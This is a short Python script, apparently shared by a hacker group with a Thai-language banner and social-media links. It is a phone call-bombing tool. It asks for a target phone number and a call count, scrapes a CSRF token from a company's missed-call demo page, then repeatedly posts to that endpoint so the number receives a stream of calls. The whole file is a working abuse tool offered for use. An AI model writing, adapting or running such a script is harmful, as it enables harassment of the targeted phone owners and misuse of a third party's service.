#Xractz
#IndoSec

import time, re, sys
from requests import Session
s = Session()

intro = """  ▒▄█▀▀█░▐█▀█▒▐█▒▐▀
  ▒▀▀█▄▄░▐█──▒▐██▌░
  ▒█▄▄█▀░▐█▄█▒▐█▒▐▄

กลุ่มFacebook :https://m.facebook.com/groups/511014426089032
ช่องYoutube  :https://m.youtube.com/channel/UCAgvG9YzURgLGGeEivig4vg
"""
print(intro)

print("กรอกเบอร์ที่จะยิง (ตัวอย่าง +66912345678)")
try:
	no = int(input("ใส่เบอร์    : "))
	jml = int(input("ใส่จำนวนที่ต้องการโทรเข้า : "))
	print()
except:
	print("\n\t* Only Number *")
	sys.exit()
	
url = "https://www.citcall.com/demo/misscallapi.php"

tkn = s.get(url).text
token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]

headers = {
	'x-requested-with':'XMLHttpRequest'
}
data = {
'cid':no,
'trying':'0',
'csrf_token':token
}

n = 0
try:
	while n < jml:
		send = s.post(url, data=data, headers=headers).text
		time.sleep(4.8)
		if 'Success' in send:
			n +=1
			print(f"[{n}] Sended to => {no}")
		else:
			print("\n\t* !? *")
			print("\n\t* ลองอีครั้ง *")
			break
except:
	print("\n\t* ERROR *")
	sys.exit()
